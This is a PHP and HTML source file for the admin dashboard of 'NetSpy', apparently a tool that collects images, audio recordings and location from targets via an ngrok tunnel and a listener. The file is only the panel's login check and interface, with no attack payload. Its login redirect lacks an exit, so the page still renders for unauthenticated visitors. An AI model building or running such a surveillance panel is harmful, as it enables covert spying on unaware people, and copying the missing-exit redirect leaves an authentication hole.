<?php
session_start();
include "./assets/components/login-arc.php";


if(isset($_COOKIE['logindata']) && $_COOKIE['logindata'] == $key['token'] && $key['expired'] == "no"){
    if(!isset($_SESSION['IAm-logined'])){
        $_SESSION['IAm-logined'] = 'yes';
    }

}
elseif(isset($_SESSION['IAm-logined'])){
    $client_token = generate_token();
    setcookie("logindata", $client_token, time() + (86400 * 30), "/"); // 86400 = 1 day
    change_token($client_token);

}


else {
    header('location: login.php');
    
}
?>
<html>
<head>
	<title></title>
	<link rel="stylesheet" href="./assets/css/panel2.css" type="text/css"/>
    
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="icon" href="./favicon.ico" type="image/icon type">
</head>


<body id="ourbody" onload="check_new_version()">
	
	<div id="mySidenav" class="sidenav">
	<p class="logo"><span>Net</span>Spy🔎</p>
  <a href="#" class="icon-a"><i class="fa fa-dashboard icons"></i> &nbsp;&nbsp;Dashboard</a>
  <a href="./images"class="icon-a"><i class="fa fa-image icons"></i> &nbsp;&nbsp;Images</a>
  <a href="./sounds"class="icon-a"><i class="fa fa-music icons"></i> &nbsp;&nbsp;Wav</a>
  <a href="#"class="icon-a"><i class="fa fa-location-arrow icons"></i> &nbsp;&nbsp;Location</a>
  <a href="./log"class="icon-a"><i class="fa fa-tasks icons"></i> &nbsp;&nbsp;Inventory</a>
  <a href="./ngrok.php"class="icon-a"><i class="fa fa-server icons"></i> &nbsp;&nbsp;Start ngrok</a>
  <a href="https://github.com/Aryanstha/NetSpy"class="icon-a"><i class="fa fa-user icons"></i> &nbsp;&nbsp;Author</a>

</div>
<div id="main">

	<div class="head">
		<div class="col-div-6">
<span style="font-size:30px;cursor:pointer; color: white;" class="nav"  >&#9776; Dashboard</span>
<span style="font-size:30px;cursor:pointer; color: white;" class="nav2"  >&#9776; Dashboard</span>
</div>
	
	<div class="col-div-6">
	<div class="profile">

		<img src="./assets/admin.png" class="pro-img" />
		<p>Admin <span>NetSpy</span></p>
	</div>
</div>

</div>

	<div id="links"></div>

	
	<div class="col-div-8">
		<div class="box-8">
		<div class="content-box">
			<p>Logs <span><button style="color: #f7403b;" id="btn-clear">Clear Logs</button></span></p>
			<br/>
			<textarea class="col-div-8" placeholder="result ..." id="result" rows="15" ></textarea>
		</div>
	</div>
	</div>

	<div class="col-div-4">
		<div class="box-4">
		<div class="content-box">
			<p>Buttons</p>
            <button  id="btn-listen">Listener Runing / press to stop</button>
    <button  id="btn-listen" onclick=saveTextAsFile(result.value,'log.txt')>Download Logs</button>
			
		</div>
	</div>
	</div>
		
	<div class="clearfix"></div>
</div>


<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script>

  $(".nav").click(function(){
    $("#mySidenav").css('width','70px');
    $("#main").css('margin-left','70px');
    $(".logo").css('visibility', 'hidden');
    $(".logo span").css('visibility', 'visible');
     $(".logo span").css('margin-left', '-10px');
     $(".icon-a").css('visibility', 'hidden');
     $(".icons").css('visibility', 'visible');
     $(".icons").css('margin-left', '-8px');
      $(".nav").css('display','none');
      $(".nav2").css('display','block');
  });

$(".nav2").click(function(){
    $("#mySidenav").css('width','300px');
    $("#main").css('margin-left','300px');
    $(".logo").css('visibility', 'visible');
     $(".icon-a").css('visibility', 'visible');
     $(".icons").css('visibility', 'visible');
     $(".nav").css('display','block');
      $(".nav2").css('display','none');
 });

</script>

</body>


</html>

<script src="./assets/js/jquery.min.js"></script>
<script src="./assets/js/script.js"></script>
<script src="./assets/js/sweetalert2.min.js"></script>
<script src="./assets/js/growl-notification.min.js"></script>
